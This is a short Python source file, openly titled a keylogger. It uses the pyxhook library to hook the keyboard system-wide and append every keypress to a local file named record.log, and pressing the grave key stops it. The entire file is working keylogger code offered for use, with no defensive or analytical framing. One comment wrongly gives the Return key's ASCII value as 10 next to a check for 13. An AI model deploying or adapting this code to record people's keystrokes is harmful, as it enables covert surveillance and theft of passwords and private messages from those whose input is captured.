##Python Keylogger
##Edited and Developed by Joshia Rheinier P.
##Compatible with versions of Python 3 and above
##Downloaded module used: pyxhook


import pyxhook

#this function is called everytime a key is pressed.
#for every key pressed, it will be recorded to a text file 
#named record.log (You can edit the name and its directory)
recordfile = "record.log"

def OnKeyPress(event):
	recordKey = open(recordfile,"a")
	if event.Ascii==32: #32 is the ascii value of space
		recordKey.write(" ")
	elif event.Ascii==13: #10 is the ascii value of <Return>
		recordKey.write("\n")
	elif event.Ascii==96: #96 is the ascii value of the grave key (`)
		hook.cancel()
	else:
		recordKey.write(event.Key)
	recordKey.close()

#initiate HookManager class
hook=pyxhook.HookManager()
#listen to all keys pressed
hook.KeyDown=OnKeyPress
#hook the keyboard
hook.HookKeyboard()
#start the keylogging
hook.start()
